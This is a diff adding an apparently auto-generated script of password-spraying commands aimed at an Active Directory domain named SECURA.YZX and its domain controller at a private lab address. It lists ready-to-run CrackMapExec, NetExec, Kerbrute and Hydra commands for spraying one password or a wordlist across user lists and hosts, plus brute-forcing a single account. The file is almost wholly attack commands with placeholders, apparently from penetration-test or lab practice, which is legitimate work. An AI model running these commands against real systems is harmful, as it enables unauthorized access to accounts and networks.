@@ -1,0 +1,47 @@
+# Auto-Spray Commands - Generated 2025-12-14 12:04:26
+# Domain: SECURA.YZX
+# DC IP: 192.168.179.97
+# Users file: spray_output/users.txt
+# Targets file: spray_output/targets.txt
+#
+# Replace <PASSWORD> or <WORDLIST> with your password/wordlist
+#======================================================================
+
+# === CrackMapExec / NetExec (SMB - shows Pwn3d! for admin) ===
+
+# Single password spray (against DC):
+crackmapexec smb 192.168.179.97 -u spray_output/users.txt -p '<PASSWORD>' -d SECURA.YZX --continue-on-success
+
+# Wordlist spray (against DC, one password per user):
+crackmapexec smb 192.168.179.97 -u spray_output/users.txt -p <WORDLIST> -d SECURA.YZX --continue-on-success --no-bruteforce
+
+# Single password spray (against all targets):
+crackmapexec smb spray_output/targets.txt -u spray_output/users.txt -p '<PASSWORD>' -d SECURA.YZX --continue-on-success
+
+# Wordlist spray (against all targets):
+crackmapexec smb spray_output/targets.txt -u spray_output/users.txt -p <WORDLIST> -d SECURA.YZX --continue-on-success --no-bruteforce
+
+# NetExec variants (same syntax):
+netexec smb 192.168.179.97 -u spray_output/users.txt -p '<PASSWORD>' -d SECURA.YZX --continue-on-success
+
+# === Kerbrute (Kerberos - stealthiest, fastest) ===
+
+# Single password spray:
+kerbrute passwordspray -d SECURA.YZX --dc 192.168.179.97 spray_output/users.txt '<PASSWORD>'
+
+# Bruteforce single user with wordlist:
+kerbrute bruteuser -d SECURA.YZX --dc 192.168.179.97 <WORDLIST> '<USERNAME>'
+
+# === Hydra (multi-protocol) ===
+
+hydra -L spray_output/users.txt -p '<PASSWORD>' smb://192.168.179.97
+
+hydra -L spray_output/users.txt -P <WORDLIST> smb://192.168.179.97
+
+hydra -L spray_output/users.txt -p '<PASSWORD>' -M spray_output/targets.txt smb
+
+# ======================================================================
+# Placeholders:
+#   <PASSWORD>  - Single password to test (e.g., 'Summer2024!')
+#   <WORDLIST>  - Path to password wordlist file
+#   <USERNAME>  - Single username for targeted bruteforce
